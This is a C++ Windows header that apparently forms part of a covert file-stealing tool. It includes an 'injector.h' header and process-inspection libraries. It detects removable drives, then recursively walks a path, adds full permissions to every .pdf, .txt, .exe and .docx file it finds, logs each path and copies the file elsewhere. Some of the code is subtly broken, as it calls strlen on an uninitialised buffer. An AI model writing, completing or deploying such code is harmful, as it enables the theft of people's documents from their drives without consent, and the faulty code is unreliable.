#pragma once
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES 1
#define _CRT_SECURE_CPP_OVERLOAD_STANDARD_NAMES_COUNT 1
#define MAX_LENGTH 128
#include <Windows.h>
#include <time.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <direct.h>
#include <tchar.h>
#include <fstream>
#include <ctime>
#include <filesystem>
#include <thread>
#include <mutex>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <string.h>
#include <commdlg.h>
#include <atomic>
#include <conio.h>
#include "injector.h"
#pragma comment(lib, "Shlwapi.lib")
std::mutex mtx;
#define INFO_BUFFER_SIZE 32767
TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;
char DRIVE_LIST[MAX_LENGTH];
char NEW_DRIVE_LIST[MAX_LENGTH];
std::string pdf = ".pdf";
std::string txt = ".txt";
std::string exe = ".exe";
std::string word = ".docx";
BOOL restartdetected = FALSE;
VOID CALLBACK WaitOrTimerCallback(
    _In_  PVOID lpParameter,
    _In_  BOOLEAN TimerOrWaitFired
)
{
    restartdetected = TRUE;
    return;
}
void controldevice(char drive[]) {
    int count = 0;
    char szLogicalDrives[MAX_PATH];
    size_t size = strlen(szLogicalDrives) + 1;
    wchar_t* text = new wchar_t[size];
    size_t outSize;
    mbstowcs_s(&outSize, text, size, szLogicalDrives, size - 1);
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, text);
    WCHAR* szSingleDrive = text;
    while (*szSingleDrive)
    {
        UINT nDriveType = GetDriveType(szSingleDrive);
        if (nDriveType == DRIVE_UNKNOWN) {
        }
        else if (nDriveType == DRIVE_NO_ROOT_DIR) {
        }
        else if (nDriveType == DRIVE_REMOVABLE) {
            char letter = szSingleDrive[0];
            drive[letter - 65] = letter;
        }
        else if (nDriveType == DRIVE_FIXED) {
        }
        else if (nDriveType == DRIVE_REMOTE) {
        }
        else if (nDriveType == DRIVE_CDROM) {
        }
        else if (nDriveType == DRIVE_RAMDISK) {
        }
        szSingleDrive += wcslen(szSingleDrive) + 1;
    }
}
inline std::string getCurrentDateTime(std::string s) {
    time_t now = time(0);
    struct tm  tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    if (s == "now")
        strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
    else if (s == "date")
        strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
    return std::string(buf);
};
inline void Logger(std::string logMsg) {
    std::string filePath = "c:\\logs\\log " + getCurrentDateTime("date") + ".txt";
    std::string now = getCurrentDateTime("now");
    std::ofstream ofs(filePath.c_str(), std::ios_base::out | std::ios_base::app);
    ofs << now << ' ' << logMsg << '\n';
    ofs.close();
}
static void copy_file_with_extentions(const std::string& path, const std::string& to, const std::string& extensions)
{
    for (auto& p : std::filesystem::recursive_directory_iterator(path, std::filesystem::directory_options::skip_permission_denied))
    {
        if (p.path().extension() == extensions)
        {
            std::string data123;
            data123 = p.path().string();
            std::filesystem::permissions(data123,
                std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
                std::filesystem::perm_options::add);
            Logger(data123);
            try
            {
                std::filesystem::copy(data123, to);
            }
            catch (std::exception& e)
            {
                Logger(e.what());
            }
        }
    }
}